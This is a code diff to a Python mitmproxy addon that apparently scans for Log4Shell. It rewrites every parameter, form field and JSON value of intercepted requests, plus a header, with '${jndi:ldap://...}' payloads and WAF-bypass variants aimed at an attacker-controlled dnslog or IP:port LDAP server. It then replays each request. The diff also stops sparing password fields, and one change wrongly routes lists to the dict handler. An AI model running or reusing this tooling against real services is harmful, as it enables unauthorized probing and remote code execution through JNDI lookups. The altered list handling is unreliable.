@@ -3,12 +3,14 @@
 # @Date  : 2021/12/16
 # @Desc  :
 """Modify HTTP query parameters."""
+import ipaddress
 import json
 import random
 import string
 import uuid
 
 import redis
+import requests
 import yaml
 from mitmproxy import ctx
 from mitmproxy import http
@@ -108,7 +110,7 @@ class JsonReplace(object):
         if isinstance(dic, dict):
             return self.replace_dict(dic, changeData)  # 传入数据的value值是字典，则直接调用自身，将value作为字典传进来
         elif isinstance(dic, list):
-            return self.replace_list(dic, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
+            return self.replace_dict(dic, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
         elif isinstance(dic, str):
             return changeData
         elif isinstance(dic, bytes):
@@ -129,8 +131,6 @@ class JsonReplace(object):
             elif isinstance(value, list):
                 dic[key] = self.replace_list(value, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
             elif isinstance(value, str):
-                if "password" in key.lower() or "passwd" in key.lower():
-                    continue
                 dic[key] = changeData
             elif isinstance(value, bytes):
                 dic[key] = changeData.encode()
@@ -157,6 +157,17 @@ class Payload(object):
     def __init__(self):
         pass
 
+    def is_ip_port(self, dnslog_base):
+        try:
+            ip_port = dnslog_base.split(":")
+            port = int(ip_port[1])
+            if port < 0 or port > 65535:
+                return False
+            ip = ipaddress.IPv4Address(ip_port[0])
+            return True
+        except Exception as E:
+            return False
+
     def bypass_waf_payload(self, raw_payload):
         new_payload = ""
         for one_raw in raw_payload:
@@ -168,8 +179,12 @@ class Payload(object):
         return new_payload
 
     def get_payload_list(self, req_uuid, dnslog_base):
-        raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
-        bypass_payload = self.bypass_waf_payload(raw_payload)
+        if self.is_ip_port(dnslog_base):
+            raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}"
+            bypass_payload = self.bypass_waf_payload(raw_payload)
+        else:
+            raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
+            bypass_payload = self.bypass_waf_payload(raw_payload)
         return [f"${{{raw_payload}}}", f"${{{bypass_payload}}}"]
 
 
@@ -224,7 +239,6 @@ class Log4jAddon(object):
         if flow.request.method == "GET":
             if flow.request.query:
 
-                flow = flow.copy()
                 req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                 payloads = self.payload_list(req_uuid)
 
@@ -234,14 +248,27 @@ class Log4jAddon(object):
                 }
                 self.send_data(req_uuid, data)
 
+                flow = flow.copy()
                 for payload in payloads:
 
                     for key in flow.request.query:
                         flow.request.query[key] = payload
 
                     flow.request.headers[self.get_header()] = payload
+
                     # 每个payload发送一次
-                    ctx.master.commands.call("replay.client", [flow])
+                    try:
+                        result = requests.get(flow.request.pretty_url,
+                                              headers=dict(flow.request.headers),
+                                              params=dict(flow.request.query))
+                    except Exception as E:
+                        print(E)
+
+                    # 每个payload发送一次
+                    try:
+                        ctx.master.commands.call("replay.client", [flow])
+                    except Exception as E:
+                        print(E)
 
         elif flow.request.method == "POST":
             if flow.request.urlencoded_form:
@@ -258,44 +285,48 @@ class Log4jAddon(object):
                 self.send_data(req_uuid, data)
 
                 for payload in payloads:
-
+                    print(flow.request.urlencoded_form)
                     for key in flow.request.urlencoded_form:
-                        # password passwd特殊处理
-                        if "password" in key.lower() or "passwd" in key.lower():
-                            continue
-
                         flow.request.urlencoded_form[key] = payload
 
                     flow.request.headers[self.get_header()] = payload
 
                     # 每个payload发送一次
-                    ctx.master.commands.call("replay.client", [flow])
-
-            elif flow.request.multipart_form:
-
-                flow = flow.copy()
-                req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
-                payloads = self.payload_list(req_uuid)
-
-                data = {
-                    "method": "POST",
-                    "url": flow.request.pretty_url,
-                    "multipart_form": dict(flow.request.multipart_form),
-                }
-                self.send_data(req_uuid, data)
-
-                for payload in payloads:
-
-                    for key in flow.request.multipart_form:
-                        # password passwd特殊处理
-                        if "password" in key.lower() or "passwd" in key.lower():
-                            continue
-                        flow.request.multipart_form[key] = payload
-
-                    flow.request.headers[self.get_header()] = payload
+                    try:
+                        result = requests.post(flow.request.pretty_url,
+                                               headers=dict(flow.request.headers),
+                                               data=dict(flow.request.urlencoded_form))
+                    except Exception as E:
+                        print(E)
 
                     # 每个payload发送一次
-                    ctx.master.commands.call("replay.client", [flow])
+                    try:
+                        result = ctx.master.commands.call("replay.client", [flow])
+                    except Exception as E:
+                        print(E)
+
+            # elif flow.request.multipart_form:
+            #
+            #     flow = flow.copy()
+            #     req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
+            #     payloads = self.payload_list(req_uuid)
+            #
+            #     data = {
+            #         "method": "POST",
+            #         "url": flow.request.pretty_url,
+            #         "multipart_form": dict(flow.request.multipart_form),
+            #     }
+            #     self.send_data(req_uuid, data)
+            #
+            #     for payload in payloads:
+            #
+            #         for key in flow.request.multipart_form:
+            #             flow.request.multipart_form[key] = payload
+            #
+            #         flow.request.headers[self.get_header()] = payload
+            #
+            #         # 每个payload发送一次
+            #         ctx.master.commands.call("replay.client", [flow])
 
             else:
                 if is_json(flow.request.content):
@@ -319,7 +350,18 @@ class Log4jAddon(object):
                         flow.request.headers[self.get_header()] = payload
 
                         # 每个payload发送一次
-                        ctx.master.commands.call("replay.client", [flow])
+                        try:
+                            result = requests.post(flow.request.pretty_url,
+                                                   headers=dict(flow.request.headers),
+                                                   json=new_dict)
+                        except Exception as E:
+                            print(E)
+
+                        # 每个payload发送一次
+                        try:
+                            ctx.master.commands.call("replay.client", [flow])
+                        except Exception as E:
+                            print(E)
 
 
 ## main
